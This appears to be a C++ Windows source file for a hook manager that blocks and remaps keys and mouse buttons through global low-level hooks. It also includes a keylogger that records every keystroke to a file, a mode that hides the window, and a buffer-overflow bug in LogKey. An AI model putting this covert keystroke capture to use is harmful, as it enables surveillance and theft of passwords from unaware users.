#include "HookManager.h"
#include <iostream>

using namespace std;

// CONSTANTS -------------------------------

#define CLEAR_FLAG 0
#define BUTTON_BLOCKING_FLAG 1
#define BUTTON_REPLACING_FLAG 2
#define CONTINUE_BUTTON_REPLACING_FLAG 4
#define BUTTON_DOWN_EMULATING_FLAG 5
#define BUTTON_UP_EMULATING_FLAG 6

#define FUNCTIONAL_BUTTON_DOWN 523
#define FUNCTIONAL_BUTTON_UP 524

// END CONSTANTS ---------------------------

// STRUCTURES ------------------------------

struct ButtonSwitch
{
    bool isMouseButton = false;
    bool isBlockedButton = false;
    int targetButtonDown = 0;
    int targetButtonUp = 0;
    int buttonToReplaceDown = 0;
    int buttonToReplaceUp = 0;
};

struct LocalVariables
{
    vector<ButtonSwitch> buttonsSwitches;
    vector<ButtonSwitch> blockedButtons;
    ButtonSwitch intermediateSwitch;
    ButtonSwitch emulationSwitch;
    int stopCode = -1;
    void(*MessageHandler)(int) = NULL;
} LOCAL;

struct Handlers
{
    HHOOK hHookMouse;
    HHOOK hHookKeyboard;
    HANDLE hFile = NULL;
} HANDLERS;

struct ActionFlag
{
    int value = 0;
} ACTION_FLAG;

// END STRUCTURES ---------------------------

// FUNCTION DEFENITION ----------------------

LRESULT CALLBACK MouseHandler(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK KeyboardHandler(int nCode, WPARAM wParam, LPARAM lParam);

void ClearActionFlag();
void HideMainWindow();

bool IsButtonDown(int wParam);
bool IsButtonUp(int wParam);
bool IsKeyDown(int flags);
bool IsKeyUp(int flags);
bool IsBlockedButton(int code, bool isMouseButton);
bool IsEmptyButtonSwitch(ButtonSwitch buttonSwitch);

int BlockButton(int wParam);
int ReplaceButton(int wParam);
int ContinueReplacingButton(int wParam);
int BlockKey(int keyFlags, int keyCode);
int ReplaceKey(int keyFlags, int keyCode);
int ContinueReplacingKey(int keyFlags, int keyCode);
ButtonSwitch GetLastSwitchForButton(int code, bool isMouseButton);
int GetEventCode(int keyCode);
void LogKey(int keyFlags, int scanCode);

// END FUNCTION DEFENITION ------------------

void Run(int mode)
{
    MSG msg = { 0 };

    InitializeWindowsHooks();

    if (mode == HIDDEN_MODE)
    {
        HideMainWindow();
    }

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void PressingWait(int sec)
{
    MSG msg = { 0 };
    Sleep(sec);
    GetMessage(&msg, NULL, 0, 0);
}

void InitializeWindowsHooks()
{
    HANDLERS.hHookMouse = SetWindowsHookEx(WH_MOUSE_LL, MouseHandler, GetModuleHandle(NULL), 0);
    HANDLERS.hHookKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHandler, GetModuleHandle(NULL), 0);
}

void SetMessageHandler(void(*handler)(int))
{
    LOCAL.MessageHandler = handler;
}

void SetStopCode(int code)
{
    LOCAL.stopCode = code;
}

void AddKeyLoggerFile(char* fileName)
{
    if (fileName != NULL && strlen(fileName) != 0)
    {
        HANDLERS.hFile = CreateFile(fileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        if (HANDLERS.hFile != NULL && HANDLERS.hFile != INVALID_HANDLE_VALUE)
        {
            return;
        }
    }
    HANDLERS.hFile = CreateFile("default.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
}

LRESULT CALLBACK MouseHandler(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_MOUSEMOVE || wParam == WM_MOUSEWHEEL)
    {
        return CallNextHookEx(HANDLERS.hHookMouse, nCode, wParam, lParam);
    }

    POINT point;
    int message = 0;

    switch (ACTION_FLAG.value)
    {
        case BUTTON_BLOCKING_FLAG:
            message = BlockButton(wParam);
            break;

        case BUTTON_REPLACING_FLAG:
            message = ReplaceButton(wParam);
            break;

        case CONTINUE_BUTTON_REPLACING_FLAG:
            message = ContinueReplacingButton(wParam);
            break;

        case BUTTON_UP_EMULATING_FLAG:        
            ClearActionFlag();
            return CallNextHookEx(HANDLERS.hHookMouse, nCode, wParam, lParam);

        case BUTTON_DOWN_EMULATING_FLAG:
            ClearActionFlag();
            return CallNextHookEx(HANDLERS.hHookMouse, nCode, wParam, lParam);

        default:
            break;
    }

    if (message == EMPTY_MESSAGE)
    {
        return -1;
    }
    else if (LOCAL.MessageHandler != NULL && ACTION_FLAG.value != CLEAR_FLAG)
    {
        ClearActionFlag();
        FreeWindowsHooksResourses();
        LOCAL.MessageHandler(message);

        return -1;
    }

    if (IsBlockedButton(wParam, true))
    {
        return -1;
    }
    
    LOCAL.emulationSwitch = GetLastSwitchForButton(wParam, true);

    if (IsEmptyButtonSwitch(LOCAL.emulationSwitch))
    {
        return CallNextHookEx(HANDLERS.hHookMouse, nCode, wParam, lParam);
    }
    else
    {
        int replaceCode = 0;

        if (IsButtonDown(wParam))
        {
            ACTION_FLAG.value = BUTTON_DOWN_EMULATING_FLAG;
            replaceCode = LOCAL.emulationSwitch.buttonToReplaceDown;
        }
        else if (IsButtonUp(wParam))
        {
            ACTION_FLAG.value = BUTTON_UP_EMULATING_FLAG;
            replaceCode = LOCAL.emulationSwitch.buttonToReplaceUp;
        }
        
        GetCursorPos(&point);
        int eventCode = GetEventCode(replaceCode);
        mouse_event(MOUSEEVENTF_ABSOLUTE | eventCode, point.x, point.y, 0, 0);
        return -1;
    }
}

LRESULT CALLBACK KeyboardHandler(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT *keyboardStruct = (KBDLLHOOKSTRUCT*) lParam;
    POINT point;
    int message = 0;
    int keyFlags = (int)keyboardStruct -> flags;
    int keyCode = keyboardStruct -> vkCode;
    int scanCode = keyboardStruct -> scanCode;

    if (LOCAL.stopCode > 0 && keyCode == LOCAL.stopCode)
    {
        FreeWindowsHooksResourses();
        TerminateProcess(GetCurrentProcess(), NO_ERROR);
    }

    LogKey(keyFlags, scanCode);

    switch (ACTION_FLAG.value)
    {
        case BUTTON_BLOCKING_FLAG:
            message = BlockKey(keyFlags, keyCode);
            break;

        case BUTTON_REPLACING_FLAG:
            message = ReplaceKey(keyFlags, keyCode);
            break;

        case CONTINUE_BUTTON_REPLACING_FLAG:
            message = ContinueReplacingKey(keyFlags, keyCode);
            break;

        case BUTTON_UP_EMULATING_FLAG:
            ClearActionFlag();
            return CallNextHookEx(HANDLERS.hHookKeyboard, nCode, wParam, lParam);

        case BUTTON_DOWN_EMULATING_FLAG:
            ClearActionFlag();
            return CallNextHookEx(HANDLERS.hHookKeyboard, nCode, wParam, lParam);

        default:
            break;
    }

    if (message == EMPTY_MESSAGE)
    {
        return -1;
    }
    else if (LOCAL.MessageHandler != NULL && ACTION_FLAG.value != CLEAR_FLAG)
    {
        ClearActionFlag();
        FreeWindowsHooksResourses();
        LOCAL.MessageHandler(message);

        return -1;
    }

    if (IsBlockedButton(keyCode, false))
    {
        return -1;
    }

    LOCAL.emulationSwitch = GetLastSwitchForButton(keyCode, false);

    if (IsEmptyButtonSwitch(LOCAL.emulationSwitch))
    {
        return CallNextHookEx(HANDLERS.hHookKeyboard, nCode, wParam, lParam);
    }
    else
    {
        if (IsKeyDown(keyFlags))
        {
            ACTION_FLAG.value = BUTTON_DOWN_EMULATING_FLAG;
            keybd_event(LOCAL.emulationSwitch.buttonToReplaceDown, NULL, NULL, NULL);
        }
        else if (IsKeyUp(keyFlags))
        {
            ACTION_FLAG.value = BUTTON_UP_EMULATING_FLAG;
            keybd_event(LOCAL.emulationSwitch.buttonToReplaceUp, NULL, KEYEVENTF_KEYUP, NULL);
        }
        return -1;
    }
}

void LogKey(int keyFlags, int scanCode)
{
    if (HANDLERS.hFile != NULL && HANDLERS.hFile != INVALID_HANDLE_VALUE)
    {
        DWORD numberOfWrittenBytes;
        char* buffer = new char[40];
        DWORD dwMsg = 1;
        dwMsg += scanCode << 16;
        dwMsg += keyFlags << 24;

        GetKeyNameTextA(dwMsg, buffer, 100);
        SetFilePointer(HANDLERS.hFile, 0, 0, FILE_END);
        
        if (IsKeyDown(keyFlags))
        {
            buffer = strcat(buffer, " down\0");
        }    
        else
        {
            buffer = strcat(buffer, " up\0");
        }
        WriteFile(HANDLERS.hFile, buffer, strlen(buffer), &numberOfWrittenBytes, NULL);
        buffer[0] = '\r';
        buffer[1] = '\n';
        WriteFile(HANDLERS.hFile, buffer, 2, &numberOfWrittenBytes, NULL);
    }
}

int GetEventCode(int keyCode)
{
    switch (keyCode)
    {
        case WM_LBUTTONDOWN: return MOUSEEVENTF_LEFTDOWN;
        case WM_RBUTTONDOWN: return MOUSEEVENTF_RIGHTDOWN;
        case WM_MBUTTONDOWN: return MOUSEEVENTF_MIDDLEDOWN;
        case FUNCTIONAL_BUTTON_DOWN: return MOUSEEVENTF_LEFTDOWN;
        case WM_LBUTTONUP: return MOUSEEVENTF_LEFTUP;
        case WM_RBUTTONUP: return MOUSEEVENTF_RIGHTUP;
        case WM_MBUTTONUP: return MOUSEEVENTF_MIDDLEUP;
        case FUNCTIONAL_BUTTON_UP: return MOUSEEVENTF_LEFTUP;
    }
    return -1;
}

int BlockButton(int wParam)
{
    if (IsButtonDown(wParam))
    {
        LOCAL.intermediateSwitch.isBlockedButton = true;
        LOCAL.intermediateSwitch.isMouseButton = true;
        LOCAL.intermediateSwitch.targetButtonDown = wParam;
        return EMPTY_MESSAGE;
    }
    else if (IsButtonUp(wParam))
    {
        LOCAL.intermediateSwitch.targetButtonUp = wParam;
        LOCAL.blockedButtons.push_back(LOCAL.intermediateSwitch);
        return BUTTON_WAS_BLOCKED;
    }
    return HOOK_MANAGER_ERROR_MESSAGE;
}

int ReplaceButton(int wParam)
{
    if (IsButtonDown(wParam))
    {
        LOCAL.intermediateSwitch.isMouseButton = true;
        LOCAL.intermediateSwitch.isBlockedButton = false;
        LOCAL.intermediateSwitch.targetButtonDown = wParam;
        return EMPTY_MESSAGE;
    }
    else if (IsButtonUp(wParam))
    {
        LOCAL.intermediateSwitch.targetButtonUp = wParam;
        return TARGET_BUTTON_ACCEPTED;
    }
    return HOOK_MANAGER_ERROR_MESSAGE;
}

int ContinueReplacingButton(int wParam)
{
    if (LOCAL.intermediateSwitch.isMouseButton)
    {
        if (IsButtonDown(wParam))
        {
            LOCAL.intermediateSwitch.buttonToReplaceDown = wParam;
            return EMPTY_MESSAGE;
        }
        else if (IsButtonUp(wParam))
        {
            LOCAL.intermediateSwitch.buttonToReplaceUp = wParam;
            LOCAL.buttonsSwitches.push_back(LOCAL.intermediateSwitch);
            return BUTTON_TO_REPLACE_ACCEPTED;
        }
    }
    return HOOK_MANAGER_ERROR_MESSAGE;
}

int BlockKey(int keyFlags, int keyCode)
{
    if (IsKeyDown(keyFlags))
    {
        LOCAL.intermediateSwitch.isBlockedButton = true;
        LOCAL.intermediateSwitch.isMouseButton = false;
        LOCAL.intermediateSwitch.targetButtonDown = keyCode;
        return EMPTY_MESSAGE;
    }
    else if (IsKeyUp(keyFlags))
    {
        LOCAL.intermediateSwitch.targetButtonUp = keyCode;
        LOCAL.blockedButtons.push_back(LOCAL.intermediateSwitch);
        return BUTTON_WAS_BLOCKED;
    }
    return HOOK_MANAGER_ERROR_MESSAGE;
}

int ReplaceKey(int keyFlags, int keyCode)
{
    if (IsKeyDown(keyFlags))
    {
        LOCAL.intermediateSwitch.isMouseButton = false;
        LOCAL.intermediateSwitch.isBlockedButton = false;
        LOCAL.intermediateSwitch.targetButtonDown = keyCode;
        return EMPTY_MESSAGE;
    }
    else if (IsKeyUp(keyFlags))
    {
        LOCAL.intermediateSwitch.targetButtonUp = keyCode;
        return TARGET_BUTTON_ACCEPTED;
    }
    return HOOK_MANAGER_ERROR_MESSAGE;
}

int ContinueReplacingKey(int keyFlags, int keyCode)
{
    if (!LOCAL.intermediateSwitch.isMouseButton)
    {
        if (IsKeyDown(keyFlags))
        {
            LOCAL.intermediateSwitch.buttonToReplaceDown = keyCode;
            return EMPTY_MESSAGE;
        }
        else if (IsKeyUp(keyFlags))
        {
            LOCAL.intermediateSwitch.buttonToReplaceUp = keyCode;
            LOCAL.buttonsSwitches.push_back(LOCAL.intermediateSwitch);
            return BUTTON_TO_REPLACE_ACCEPTED;
        }
    }
    return HOOK_MANAGER_ERROR_MESSAGE;
}

ButtonSwitch GetLastSwitchForButton(int code, bool isMouseButton)
{
    int startCode = code;
    int resultCode = code;
    int resultIndex = -1;

    for (int i = 0; i < LOCAL.buttonsSwitches.size(); i++)
    {

        if (LOCAL.buttonsSwitches[i].isMouseButton == isMouseButton &&
            LOCAL.buttonsSwitches[i].targetButtonDown == resultCode &&
            LOCAL.buttonsSwitches[i].buttonToReplaceDown != startCode)
        {
            resultCode = LOCAL.buttonsSwitches[i].buttonToReplaceDown;
            resultIndex = i;
            continue;
        }

        if (LOCAL.buttonsSwitches[i].isMouseButton == isMouseButton &&
            LOCAL.buttonsSwitches[i].targetButtonUp == resultCode &&
            LOCAL.buttonsSwitches[i].buttonToReplaceUp != startCode)
        {
            resultCode = LOCAL.buttonsSwitches[i].buttonToReplaceUp;
            resultIndex = i;
            continue;
        }
    }

    if (resultIndex == -1)
    {
        return ButtonSwitch();
    }
    return LOCAL.buttonsSwitches[resultIndex];
}

bool IsBlockedButton(int code, bool isMouseButton)
{
    for (int i = 0; i < LOCAL.blockedButtons.size(); i++)
    {
        if (LOCAL.blockedButtons[i].isMouseButton == isMouseButton &&
            LOCAL.blockedButtons[i].isBlockedButton &&
            (LOCAL.blockedButtons[i].targetButtonUp == code || LOCAL.blockedButtons[i].targetButtonDown == code))
        {
            return true;
        }
    }
    return false;
}

bool IsButtonDown(int wParam)
{

    return wParam == WM_LBUTTONDOWN || 
        wParam == WM_RBUTTONDOWN || 
        wParam == WM_MBUTTONDOWN ||
        wParam == FUNCTIONAL_BUTTON_DOWN;
}

bool IsButtonUp(int wParam)
{
    return wParam == WM_LBUTTONUP || 
        wParam == WM_RBUTTONUP || 
        wParam == WM_MBUTTONUP ||
        wParam == FUNCTIONAL_BUTTON_UP;
}

bool IsKeyDown(int flags)
{
    return flags >= 0 && flags < 128;
}

bool IsKeyUp(int flags)
{
    return flags >= 128;
}

bool IsEmptyButtonSwitch(ButtonSwitch buttonSwitch)
{
    return buttonSwitch.buttonToReplaceDown == 0 &&
        buttonSwitch.buttonToReplaceUp == 0 &&
        buttonSwitch.targetButtonDown == 0 &&
        buttonSwitch.targetButtonUp == 0;
}

void SetFlagForButtonBlocking()
{
    ACTION_FLAG.value = BUTTON_BLOCKING_FLAG;
}

void SetFlagForButtonReplacing()
{
    ACTION_FLAG.value = BUTTON_REPLACING_FLAG;
}

void SetFlagForContinueReplacing()
{
    ACTION_FLAG.value = CONTINUE_BUTTON_REPLACING_FLAG;
}

void ClearActionFlag()
{
    ACTION_FLAG.value = CLEAR_FLAG;
}

void FreeWindowsHooksResourses()
{
    UnhookWindowsHookEx(HANDLERS.hHookKeyboard);
    UnhookWindowsHookEx(HANDLERS.hHookMouse);
}

void CloseKeyloggerFile()
{
    CloseHandle(HANDLERS.hFile);
}

void HideMainWindow()
{
    HWND hMainWindow = GetForegroundWindow();

    if (hMainWindow != NULL && hMainWindow != INVALID_HANDLE_VALUE)
    {
        ShowWindow(hMainWindow, SW_HIDE);
    }
}


